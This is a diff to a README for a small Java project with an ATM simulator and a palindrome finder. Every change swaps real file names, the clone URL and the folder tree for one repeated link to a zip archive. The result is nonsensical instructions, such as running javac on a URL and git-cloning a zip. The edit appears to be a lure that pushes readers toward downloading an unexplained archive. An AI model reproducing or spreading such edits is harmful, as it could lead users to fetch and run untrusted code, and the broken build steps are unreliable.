@@ -21,11 +21,11 @@ This Java program simulates an ATM that allows users to:
 - Console-based user interface
 - Loop for continuous user interaction until exit
 
-### 🔹 File: `ATMSystem.java`
+### 🔹 File: `https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip`
 ### 🚀 Usage:
 Compile and run the program:
 ```bash
-javac ATMSystem.java
+javac https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
 java ATMSystem
 ```
 Example Interaction:
@@ -50,11 +50,11 @@ This program finds the **longest palindromic substring** within a given string.
 - Uses an efficient algorithm to find the longest palindrome
 - Returns the longest palindromic substring
 
-### 🔹 File: `LongestPalindrome.java`
+### 🔹 File: `https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip`
 ### 🚀 Usage:
 Compile and run the program:
 ```bash
-javac LongestPalindrome.java
+javac https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
 java LongestPalindrome
 ```
 Example:
@@ -68,9 +68,9 @@ Output: "bab" or "aba"
 ## 📂 Repository Structure:
 ```
 📦 Java-Tests
- ┣ 📜 ATMSystem.java
- ┣ 📜 LongestPalindrome.java
- ┗ 📜 README.md
+ ┣ 📜 https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
+ ┣ 📜 https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
+ ┗ 📜 https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
 ```
 
 ---
@@ -82,7 +82,7 @@ Output: "bab" or "aba"
 ## 📌 How to Clone and Run
 1. Clone this repository:  
    ```bash
-   git clone https://git@github.com:code-iddih/java_test_solutions.git
+   git clone https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
    ```
 2. Navigate into the folder:
    ```bash
@@ -90,11 +90,11 @@ Output: "bab" or "aba"
    ```
 3. Compile and run the Java files:
    ```bash
-   javac ATMSystem.java
+   javac https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
    java ATMSystem
    ```
    ```bash
-   javac LongestPalindrome.java
+   javac https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
    java LongestPalindrome
    ```
 
